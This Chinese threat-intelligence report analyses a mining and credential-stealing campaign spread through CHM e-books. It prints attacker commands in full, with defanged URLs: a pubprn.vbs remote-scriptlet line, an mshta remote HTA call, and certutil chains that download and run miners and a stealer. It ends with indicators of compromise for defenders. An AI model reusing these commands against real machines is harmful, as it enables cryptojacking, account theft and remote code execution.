@@ -1,0 +1,361 @@
+## **一、概述**  
+
+**近期腾讯御见威胁情报中心捕获到利用一堆色情类电子书（chm格式）传播的恶意挖矿病毒，病毒使用一批极具诱惑力的文件名（本文分析样本使用名为“想不想知道xx之间的秘密.chm”）在网络中传播。**
+
+![1.png挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278190521580.png!small)
+
+病毒使用执行远程脚本的方法，并结合白利用，代码混淆，无文件内存装载等技术来躲避安全厂商的查杀，受害者一旦打开这些chm格式的电子书，病毒便会隐藏进用户机器中。
+
+病毒目前行为主要有释放挖矿病毒，安装Chrome浏览器恶意插件，在用户交易虚拟加密币时劫持收款地址，盗取用户facebook帐号信息，并自动在facebook网站分享若干“小黄书”chm下载链接实现蠕虫式的传播。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278191265997.png!small)
+
+##  **二、样本分析**
+
+chm文档结构如下图，运行chm文档后文档内Load_HTML_CHM0.html内混淆的脚本代码会以命令行"C:\Windows\System32\wscript.exe"
+/b C:/Windows/System32/Printing_Admin_Scripts/zh-CN/pubprn.vbs 127.0.0.1
+script:hxxp://png.realtimenews.tk/chm.sct
+
+来执行hxxp://png.realtimenews.tk/chm.sct内的远程脚本。
+
+![3.png挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278191784029.png!small)
+
+脚本代码通过访问一个外部链接的图片q.png，并查找图片数据中的tEXt，iENd两个标记，截取tEXt+4位置到iENd-8处的文件内容，Base64解码后存放到Temp目录以tmpg.Jpg命名，并用Rundll32.exe拉起执行，tmpg.Jpg其实为一个带有导出函数VoidFunc且加壳的DLL。
+
+截取png中隐藏数据
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278192433818.png!small)
+
+q.png表象上看为一个透明背景中心发亮的PNG图片。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278192616662.png!small)
+
+q.png文件tEXt+4位置指向了一个BASE64编码的PE文件内容开始位置.
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278192935035.png!small)
+
+q.png文件iENd-8指向了一个BASE64编码的PE文件内容末尾位置。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278193173304.png!small)
+
+Rundll32.exe进一步拉起执行tmpg.Jpg
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278193537226.png!small)
+
+tmpg.Jpg为带有导出函数VoidFunc的DLL
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278193703818.png!small)
+
+被RunDll32拉起的tmpg.Jpg通过执行导出函数VoidFun，然后在内存中解密出一段Shellcode，通过CreateThread的方式执行起来。
+
+创建线程执行Shellcode
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278194009634.png!small)
+
+Shellcode代码通过遍历LDR链找到kernel32模块，然后获取LoadLibraryA的地址，加载Wininet模块，然后获得一系列网络操作函数
+
+InternetConnectA,httpOpenRequestA,httpSendRequestA地址调用，最终向域名
+
+dazqc4f140wtl.cloudfront.net发送一个Get网络请求，并使用InternetReadFIle来接收网络文件数据流，请求域名藏在Shellcode的尾部。
+
+Shellcode装载Wininet模块
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278194374790.png!small)
+
+Get请求域名藏在解密后的Shellcode尾部
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278194494905.png!small)
+
+通过抓包工具可以直接看到，Get请求后服务器发送回来的数据流有一个明文的PE文件，通过从内存Dump出该模块可知该模块还是一个DLL，并使用反射式加载的方法，实现该模块代码不落地装载。
+
+病毒Get请求后返回的明文PE文件数据流
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278194814321.png!small)
+
+反射式加载的DLL
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278194938311.png!small)
+
+观察该模块可知为Cobalt
+Strike生成的DLL后门攻击模块，该后门攻击模块数据交互支持HTTP、HTTPS、DNS和SMB隧道协议，本次样本使用HTTP协议的方式进行通信交互，后门攻击模块首先通过异或0x69解密出上线配置信息。
+
+使用异或解密配置信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278195307180.png!small)
+
+解密后的后门明文C2信息，Url、UserAgent信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278195442167.png!small)
+
+通过抓包时可获得服务器下发指令，指令中有指向远程脚本连接明显字段hxxp://d3goboxon32grk2l.tk/reg9.sct，该指令主要为实现挖矿行为。
+
+下发指令信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278195644105.png!small)
+
+远程脚本reg9.sct会在系统中添加两个启动项，ps5.txt为一个Html页面，其中夹杂混淆的vbs脚本代码，reg9.sct启动项保证其自身远程脚本逻辑每次开机执行，并结合wmic展开持久性攻击。
+
+相关脚本代码
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278195843689.png!small)
+
+启动项
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/1527819598375.png!small)
+
+之后reg9.sct脚本通过访问hxxp://d3goboxon32grk2l.tk/gd32.txt
+或者gd64.txt链接获取文件流数据然后再本地temp目录创建启动一个名为explore.exe的进程，其中会判断系统版本进一步适配x86或x64的对应程序。
+
+创建运行挖矿程序
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278196209811.png!small)
+
+.txt后缀文本实际为加Vmp壳的exe可执行文件
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278196368578.png!small)
+
+观察挖矿内部信息可知为挖矿端程序，矿池和钱包地址以明文形式存放。除此外，矿机程序还会访问执行
+
+hxxp://down.cacheoffer.tk/d2/reg9.sct、hxxp://xmr.enjoytopic.tk/d2/reg9.sct两个地址中的远程脚本，分析时down.cacheoffer.tk/d2/reg9.sct脚本已经清空内容，不排除以后病毒作者继续使用的可能性，xmr.enjoytopic.tk/d2/reg9.sct中的脚本会再次拉取挖矿程序和添加病毒启动项来确保病毒正常运行。
+
+reg9.sct自身也会释放名为evil或evil2的js脚本到Temp目录执行，js脚本的运行同样是为了确保挖矿病毒运行成功。
+
+挖矿病毒内明文内容
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278197107589.png!small)
+
+病毒使用门罗币钱包当前信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278197231299.png!small)
+
+ps5.txt内有一个混淆的vbs脚本文件，脚本代码执行后会带参数结合dotnet静态方法执行PowerShell，整理后的dotnet相关代码分析可知，作用为申请内存创建线程来执行一段Base64编码过的Shellcode。
+
+ps5.txt中混淆的vbs脚本代码如图所示
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278197578241.png!small)
+
+PwoerShell去混淆后的dotnet代码
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278197814766.png!small)
+
+对Shellcode解码可知与文章开头的tmpg.Jpg中的Shellcode代码相似度极高，依然会尝试读取网络文件，不同点是隐藏在Shellcode尾部的域名改为了ssl2.blockbitcoin.com，分析时测试该域名已暂时无法解析，不排除以后病毒团伙会再次启用。
+
+同样藏在Shellcode尾部的域名
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/1527819806638.png!small)
+
+reg9.sct最后还会拉起一个带dotnet方法参数的PowerShell，此处参数混淆的方法与ps5.txt处相比主要为数据压缩方式上有不同，整理混淆代码后分析可知为从云端拉取一个fs.png的文件数据，此文件与文章开头使用脚本拉取的q文件一样是个透明背景的图片，并且在图片内部通过标签tEXt+4和标签IEND-12定位到图片中以BASE64编码的Shellcode代码，解码后Shellcode中隐藏了一个DLL，Shellcode主要功能为加载这个DLL。
+
+混淆的PowerShell参数
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278198319729.png!small)
+
+整理混淆后的相关代码
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278198494980.png!small)
+
+图片中解码出的Shellcode文件
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278198714126.png!small)
+
+DLL恶意代码执行后会查找Chrome进程，如果当前Chrome进程正在运行，则结束掉Chrome进程，然后以静默的方式释放安装Chrome.crx插件包，进一步达到劫持用户比特币交易接受地址，窃取用户facebook社交帐号和利用社交帐号进一步分享恶意的chm文档传播的功能。
+
+查找结束Chome浏览器进程
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278199235963.png!small)
+
+创建Chrome.crx插件包
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278199444088.png!small)
+
+创建Chrome文件夹并在其中创建名为sec.vbe，manifest.json，background.js，content.js，page.js的脚本文件。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278199618150.png!small)
+
+运行sec.vbe脚本，作用为装载Chrome.crx插件包。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278199876003.png!small)
+
+下图为安装插件包时的命令行，可知使用--silent-launch参数来隐藏浏览器窗口安装插件，观察插件相关的混淆js脚本代码可知，插件主要功能为替换虚拟货币交易时的收款地址，二维码信息。此外，还会窃取社交站点帐号密码，然后下载chm文档并上传到社交站点恶意的chm分享连接来进一步传播。
+
+插件包安装命令行
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278200627104.png!small)
+
+js中用来替换的比特币收款地址，二维码信息和门罗币地址
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278200889285.png!small)
+
+替换收款地址相关代码
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278201144323.png!small)
+
+窃取帐号的社交站点过滤信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278201527083.png!small)
+
+js中的相关的facebook分享连接
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278201794704.png!small)
+
+js中会访问一个恶意地址连接，返回的BASE64编码的数据流
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278202121786.png!small)
+
+本地解码数据文件测试为一个chm文档，此文档和文章开头的恶意利用文档相似，依然含有恶意代码，目的为进一步通过分享来扩散传播。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278202493864.png!small)
+
+##  **三、历史样本**
+
+chm格式作为一种常见的文档类型，经常被不法分子恶意利用，腾讯御见威胁情报中心对此类型病毒早有监控，例如去年双11期间，腾讯安全团队监控到的“[Torchwood远控木马](http://www.freebuf.com/articles/system/153850.html)”，该木马通过多种手段对电商行业进行钓鱼攻击。受害者一旦运行了钓鱼文档，极有可能导致电脑中的重要资料被窃取。
+
+本次病毒样本中，通过C2地址blockbitcoin.com我们也关联到了去年腾讯安全团队发现的一起“利用redis漏洞入侵服务器挖矿”的攻击案例。对比两次案例可知，两次事件中攻击者不止使用了相同的C2，作案方式手法也很相似，可推测为同一团伙所为。而在“利用redis漏洞入侵服务器挖矿”事件中，我们也捕获到了该团伙更多的C2的下发指令，主要有以下部分内容。
+
+指令1：mshta hxxp://winapt.s3-accelerate.amazonaws.com/vbs.hta
+
+该程序会扫描计算机目录下的有bitcoin字符串的文件，然后通过文件中的url地址上传。
+
+Vbs.hta
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278202868553.png!small)
+
+上传页面
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278203037153.png!small)
+
+指令2：
+
+    
+    
+    certutil -urlcache -split -f hxxp://winapt.s3-accelerate.amazonaws.com/rigd32.exe svchost.exe && svchost.exe -o pool.minexmr.com:5555 -u 
+    
+    45JymPWP1DeQxxMZNJv9w2bTQ2WJDAmw18wUSryDQa3RPrympJPoUSVcFEDv3bhiMJGWaCD4a3KrFCorJHCMqXJUKApSKDV -p %COMPUTERNAME% -k -B && certutil -urlcache -split -f hxxp://winapt.s3-accelerate.amazonaws.com/rigd32.exe deleteZcertutil -urlcache -split -f hxxp://winapt.s3-accelerate.amazonaws.com/rigd64.exe svhost.exe && svhost.exe -o pool.minexmr.com:5555 -u 
+    
+    45JymPWP1DeQxxMZNJv9w2bTQ2WJDAmw18wUSryDQa3RPrympJPoUSVcFEDv3bhiMJGWaCD4a3KrFCorJHCMqXJUKApSKDV -p %COMPUTERNAME% -k -B && certutil -urlcache -split -f hxxp://winapt.s3-accelerate.amazonaws.com/rigd64.exe deletecertutil -urlcache -split -f hxxp://winapt.s3-accelerate.amazonaws.com/tg.exe svthost.exe && svthost.exe && certutil 
+    
+    -urlcache -split -f hxxp://winapt.s3-accelerate.amazonaws.com/tg.exe
+
+该指令会下载矿机挖矿，然后去下载tg.exe文件，tg.exe会开启窃取隐私信息线程，线程开始先查找%temp%下.txt文件是否存在并且是否有内容，如果不存在，说明没有窃取信息，则开始窃取信息，并写入文件内。
+
+盗取信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278203274390.png!small)
+
+窃取Chrome缓存
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278203599489.png!small)
+
+窃取Firefox信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278203866392.png!small)
+
+查找Firefox配置文件，并利用nss3.dll函数解密
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278204595635.png!small)
+
+盗取cookies
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/1527820484904.png!small)
+
+此病毒还会通过hxxps://pastebin.com/raw/21Yaa7xn访问
+
+hxxps://emsisoft.github.io/a.html的一个js挖矿。
+
+访问链接
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278205017916.png!small)
+
+JS挖矿链接
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278205406454.png!small)
+
+##  **四、溯源**
+
+通过关联到的往期病毒相关信息，对js挖矿页面的溯源发现，该网站是github申请的个人网站，在该项目中，发现b.html同样是JS挖矿。
+
+github中的项目信息
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/1527820565125.png!small)
+
+JS挖矿代码
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278205785974.png!small)
+
+在其中一份代码发现疑似作者信息。
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278206005309.png!small)
+
+作者收藏的网站钓鱼项目
+
+![挖矿木马借“XX的秘密”等小黄书疯传](https://image.3001.net/images/20180601/15278206191866.png!small)
+
+##  **五、安全建议**
+
+提醒用户注意以下几点：
+
+> 1、建议任何时候打开疑似色情内容的文件，须特别小心。病毒木马传播者最擅长利用色情内容做掩护传播病毒木马；
+>
+>
+> 2、若发现电脑变得异常卡慢，可先通过任务管理器检查系统资源占用情况，若CPU、GPU使用率长时间明显偏高，可怀疑是否遭遇挖矿病毒攻击，建议使用安全软件检查；
+>
+> 3、个人用户可使用安全产品，拦截可能的病毒攻击。
+
+##  **六、IOCs**
+
+ **Md5**
+
+> 35F24CC5B580DBBF3F516663E7167B9A
+>
+> EA71DF605CB95A14E0FB3B4FA0A92EC7
+>
+> 6D2648F5DE9B1CBDEE6D6FC67573C239
+>
+> F6C616D0B19FB276BDC511D8BE2BF6D1
+>
+> 1B3BF4165CA43E964E1FD25BB6F99DF5
+>
+> 691D2B814127CC37548162ED2955824C
+
+ **C2**
+
+> dazqc4f140wtl.cloudfront.net
+>
+> blockbitcoin.com
+>
+> ssl2.blockbitcoin.com
+
+ **Url**
+
+> hxxp://png.realtimenews.tk/chm.sct
+>
+> hxxp://png.realtimenews.tk/q.png
+>
+> hxxp://png.realtimenews.tk/fs.png
+>
+> hxxp://d3goboxon32grk2l.tk/reg9.sct
+>
+> hxxp://d3goboxon32grk2l.tk/ps5.txt
+>
+> hxxp://down.cacheoffer.tk/d2/reg9.sct
+>
+> hxxp://xmr.enjoytopic.tk/d2/reg9.sct
+>
+> hxxp://news.realnewstime.xyz/news/us
+>
+> hxxp://winapt.s3-accelerate.amazonaws.com/vbs.hta
+>
+> hxxp://winapt.s3-accelerate.amazonaws.com/rigd32.exe
+>
+> hxxp://winapt.s3-accelerate.amazonaws.com/rigd64.exe
+>
+> hxxp://winapt.s3-accelerate.amazonaws.com/tg.exe
+>
+> hxxps://pastebin.com/raw/21Yaa7xn
+>
+> hxxps://emsisoft.github.io/a.html
+>
+> hxxp://abx.azurewebsites.net/blobupload/windows
+
+ ***本文作者：腾讯电脑管家，转载请注明来自 FreeBuf.COM**
+
